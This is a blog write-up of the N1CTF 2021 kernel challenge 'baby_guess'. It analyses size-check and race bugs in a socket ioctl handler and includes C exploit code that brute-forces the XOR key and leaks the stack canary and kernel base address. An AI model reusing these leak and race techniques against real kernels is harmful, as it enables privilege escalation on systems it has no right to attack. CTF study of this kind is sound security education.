@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>N1CTF 2021 - baby_guess | kileak</title>
+
+
+
+
+
+<meta name="description" content="N1CTF 2021 - baby_guess">
+
+
+<meta name="keywords" content="n1ctf, baby_guess">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/n1ctf21-babyguess/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">N1CTF 2021 - baby_guess</h1>
+      <p class="post-meta">Nov 21, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Baby_guess
+<!--break--></p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/n1ctf21/babyguess/babyguess.zip">babyguess.zip</a> <a href="https://kileak.github.io/assets/n1ctf21/babyguess/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/n1ctf21/babyguess/pwn.c">pwn.c</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">Baby_guess</code> was a kernel module, which provided a simple xor encryption and “guessing” function in the kernel.</p>
+
+<p>The module registered a socket, with which we could communicate with it. The socket had two custom functions, which can be triggered via <code class="language-plaintext highlighter-rouge">ioctl</code> and <code class="language-plaintext highlighter-rouge">setsockopts</code>.</p>
+
+<h1 id="analysis">Analysis</h1>
+
+<p>Decompilation from ida and ghidra looked quite awkward and used a lot of local variables, which made it a bit hard to spot the bug.</p>
+
+<p>So, here’s some stripped pseudo code to make it more obvious.</p>
+
+<p><code class="language-plaintext highlighter-rouge">ioctl</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Request</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sub_command</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buffer_size</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">ioctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">Request</span><span class="o">*</span> <span class="n">req</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">size_t</span> <span class="n">validated_size</span><span class="p">;</span>    
+    <span class="n">Request</span> <span class="n">k_req</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">k_buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">cmd</span> <span class="o">==</span> <span class="mh">0x13371001</span> <span class="p">)</span>
+        <span class="k">return</span> <span class="n">set_device_size</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">cmd</span> <span class="o">==</span> <span class="mh">0x13371002</span> <span class="p">)</span> <span class="p">{</span>                  
+        <span class="n">memset</span><span class="p">(</span><span class="n">k_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">k_buffer</span><span class="p">));</span>
+          
+        <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">k_req</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span> <span class="p">)</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+        <span class="c1">// compare user input with encrypted device buffer</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">k_req</span><span class="p">.</span><span class="n">sub_command</span> <span class="o">==</span> <span class="mh">0x1337</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">validated_size</span> <span class="o">=</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer_size</span><span class="p">;</span>
+                        
+            <span class="k">if</span> <span class="p">(</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer_size</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
+                <span class="n">validated_size</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+        
+            <span class="c1">// copy_from_user uses validated size            </span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">k_buffer</span><span class="p">,</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">validated_size</span><span class="p">)</span> <span class="p">)</span>
+                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+            
+            <span class="c1">// memcmp uses original (unchecked) size</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">dev_info</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">k_buffer</span><span class="p">,</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer_size</span><span class="p">)</span> <span class="p">)</span>
+                <span class="k">return</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer_size</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="c1">// compare user input with magic key</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">k_req</span><span class="p">.</span><span class="n">subcmd</span> <span class="o">==</span> <span class="mh">0x1338</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">validated_size</span> <span class="o">=</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer_size</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer_size</span> <span class="o">&gt;</span> <span class="mi">256</span> <span class="p">)</span>
+                <span class="n">validated_size</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+                    
+            <span class="c1">// copy_from_user uses original (unchecked) size</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">k_buffer</span><span class="p">,</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">k_req</span><span class="p">.</span><span class="n">buffer_size</span><span class="p">)</span> <span class="p">)</span>
+                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        
+            <span class="c1">// memcmp uses validated size</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">magic_key</span><span class="p">,</span> <span class="n">k_buffer</span><span class="p">,</span> <span class="n">validated_size</span><span class="p">)</span> <span class="p">)</span>
+                <span class="k">return</span> <span class="n">validated_size</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>With the comments, it should be quite easy to see.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Leaking via compare</code></p>
+
+<p>Option <code class="language-plaintext highlighter-rouge">0x1337</code>, which is used to compare our input buffer with the encrypted device buffer, verifies that the size of our input buffer is not bigger than <code class="language-plaintext highlighter-rouge">0x100</code> bytes. But it uses the validated size only for copying our buffer to kernel memory. When doing <code class="language-plaintext highlighter-rouge">memcmp</code> to compare our buffer with the device buffer it uses the original size from our request.</p>
+
+<p>By this, we will be able to leak data behind <code class="language-plaintext highlighter-rouge">k_buffer</code> by setting size to <code class="language-plaintext highlighter-rouge">0x101</code> and then repeat the requests over and over, while forging an encrypted device buffer, which contains a “compare” byte at offset <code class="language-plaintext highlighter-rouge">0x101</code>. We can then check, if the compare was successful. This way we can guess/bruteforce the kernel stack guard, module address and kernel address. Forging the encrypted buffer will be a bit tricky, since we normally can only put <code class="language-plaintext highlighter-rouge">0x100</code> bytes into it, but let’s get back to this later.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Kernel stack overflow</code></p>
+
+<p>Option <code class="language-plaintext highlighter-rouge">0x1338</code> has a similar bug, though this time it’s “the other way round”. <code class="language-plaintext highlighter-rouge">copy_from_user</code> will use the original unvalidated size, while <code class="language-plaintext highlighter-rouge">memcmp</code> uses the validated one.</p>
+
+<p>This enables us to do an easy stack overflow. We just need to get some leaks first, so we know the kernel stack guard and have some useful gadgets to create a rop chain.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Set device buffer size</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">set_dev_info_size</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">old_size</span><span class="p">;</span>
+
+  <span class="n">old_size</span> <span class="o">=</span> <span class="n">dev_info</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
+  <span class="n">dev_info</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">MSG_NO_OVERFLOW</span><span class="p">);</span>
+
+    <span class="n">dev_info</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">old_size</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This function will set the size for the encryption method. Though it will check, that the size must not be bigger than <code class="language-plaintext highlighter-rouge">0x100</code>. But since there are no locks, and it stores the size in <code class="language-plaintext highlighter-rouge">dev_info.size</code> at the beginning, then does the check, print a kernel message and sets it back, this will be easily raceable!</p>
+
+<p><code class="language-plaintext highlighter-rouge">setsockopts</code></p>
+
+<p>The module also had a custom <code class="language-plaintext highlighter-rouge">setsockopts</code> function, with which we can encrypt our user input into the device buffer.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">setsockopts</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">level</span><span class="p">,</span> <span class="kt">int</span> <span class="n">optname</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">optlen</span><span class="p">)</span>
+<span class="p">{</span>  
+  <span class="k">if</span> <span class="p">(</span> <span class="n">optname</span> <span class="o">==</span> <span class="mh">0xDEADBEEF</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">encrypt</span><span class="p">(</span><span class="n">optval</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">optname</span> <span class="o">==</span> <span class="mh">0x13371337</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mh">0x1337</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">encrypt_buffer</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">user_buffer</span><span class="p">)</span>
+<span class="p">{</span>  
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">dev_size</span> <span class="o">=</span> <span class="n">dev_info</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
+    
+  <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">dev_info</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">user_buffer</span><span class="p">,</span> <span class="n">dev_size</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="mh">0xFFFFFFFFFFFFFFEA</span><span class="p">;</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xFF</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">dev_info</span><span class="p">.</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">magic_key</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+
+  <span class="k">return</span> <span class="n">dev_size</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>With <code class="language-plaintext highlighter-rouge">optname</code> as <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> we can trigger the encryption function, which will use the size from <code class="language-plaintext highlighter-rouge">dev_info.size</code> to copy our buffer into the device buffer.</p>
+
+<p>As mentioned above, setting <code class="language-plaintext highlighter-rouge">dev_info.size</code> can be race. We can just start a thread, which will call <code class="language-plaintext highlighter-rouge">set_dev_info_size(0x1000)</code> over and over again and the chance that <code class="language-plaintext highlighter-rouge">encrypt_buffer</code> will use our invalid <code class="language-plaintext highlighter-rouge">dev_info.size</code> is very high.</p>
+
+<p>This, combined with option <code class="language-plaintext highlighter-rouge">0x1337</code> from <code class="language-plaintext highlighter-rouge">ioctl</code> can then be used to retrieve kernel leaks from the stack.</p>
+
+<p>So, let’s start with the exploit itself.</p>
+
+<h1 id="leak-magic-key">Leak magic key</h1>
+
+<p>For using the compare method to leak stack values, we need to exactly control what’s stored in the encrypted device buffer. For this, we first need to know the <code class="language-plaintext highlighter-rouge">magic key</code>, which is initialized with 256 random bytes at module initialization.</p>
+
+<p>But we can get this easily via the compare option <code class="language-plaintext highlighter-rouge">0x1338</code> by just comparing the first byte for range <code class="language-plaintext highlighter-rouge">0x0 - 0x255</code> and then increase the size, until we have “guessed” the complete key.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define MAGIC_FAM 0xf
+</span>
+<span class="cp">#define SET_SIZE 0x13371001
+#define COMPARE 0x13371002
+</span>
+<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
+<span class="kt">char</span> <span class="n">magic_key</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+
+<span class="k">struct</span> <span class="n">Request</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sub_command</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buffer_size</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">send_compare_req</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sub_command</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buffer_size</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">sub_command</span> <span class="o">=</span> <span class="n">sub_command</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">buffer_size</span> <span class="o">=</span> <span class="n">buffer_size</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span>
+    <span class="p">};</span>
+
+    <span class="k">return</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">COMPARE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">read_magic_key</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">ch</span><span class="o">&lt;=</span><span class="mh">0xff</span><span class="p">;</span> <span class="n">ch</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">magic_key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">ch</span><span class="p">;</span>
+
+            <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">send_compare_req</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1338</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">magic_key</span><span class="p">);</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="n">res</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">MAGIC_FAM</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Leak magic key</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">read_magic_key</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="n">getchar</span><span class="p">();</span>
+
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<h1 id="leak-stack-guard-and-kernel-addresses">Leak stack guard and kernel addresses</h1>
+
+<p>Knowing the <code class="language-plaintext highlighter-rouge">magic_key</code>, we can now exactly control what will be stored in the device buffer, so we can now start to forge buffers to guess/bruteforce the stack guard and kernel addresses.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">run_size_overwrite</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">thread_overwrite_size</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// keep overwriting device buffer size with 0x200</span>
+    <span class="k">while</span><span class="p">(</span><span class="n">run_size_overwrite</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">SET_SIZE</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>        
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">encrypt_buffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">magic_key</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>    
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">leak_kernel</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// create buffer which will be encrypted to 0x0 bytes</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
+    <span class="n">encrypt_buffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="c1">// create buffer for comparing to encrypted device buffer</span>
+    <span class="kt">char</span> <span class="n">comparer</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">comparer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x18</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">ch</span><span class="o">&lt;</span><span class="mh">0x256</span><span class="p">;</span> <span class="n">ch</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// set compare byte</span>
+            <span class="n">buffer</span><span class="p">[</span><span class="mh">0x100</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">ch</span><span class="p">;</span>
+            <span class="n">comparer</span><span class="p">[</span><span class="mh">0x100</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">ch</span><span class="p">;</span>
+
+            <span class="c1">// encrypt oversized buffer into device buffer</span>
+            <span class="kt">int</span> <span class="n">sockres</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">while</span> <span class="p">(</span><span class="n">sockres</span> <span class="o">!=</span> <span class="mh">0x200</span><span class="p">)</span> <span class="p">{</span>                
+                <span class="n">sockres</span> <span class="o">=</span> <span class="n">setsockopt</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="c1">// send compare request</span>
+            <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">send_compare_req</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">,</span> <span class="mh">0x100</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">comparer</span><span class="p">);</span>
+
+            <span class="c1">// check if we found a valid byte</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">MAGIC_FAM</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Leak magic key</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">read_magic_key</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Start size overwrite thread</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">pthread_t</span> <span class="n">thread_id</span><span class="p">;</span>
+    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">thread_id</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">thread_overwrite_size</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Leak kernel addresses</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">leak_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="n">run_size_overwrite</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">module</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x108</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x110</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">kernel</span> <span class="o">-</span> <span class="mh">0x902b1d</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"CANARY      : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"MODULE      : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">module</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"KERNEL      : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"KERNEL BASE : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
+
+    <span class="n">getchar</span><span class="p">();</span>
+
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>It’s pretty similar to guessing the magic key, only that we have to overcome the size restriction of <code class="language-plaintext highlighter-rouge">0x100</code> this time. As mentioned above we can do this by starting a thread, that will set the size of the device buffer to <code class="language-plaintext highlighter-rouge">0x200</code> over and over again.</p>
+
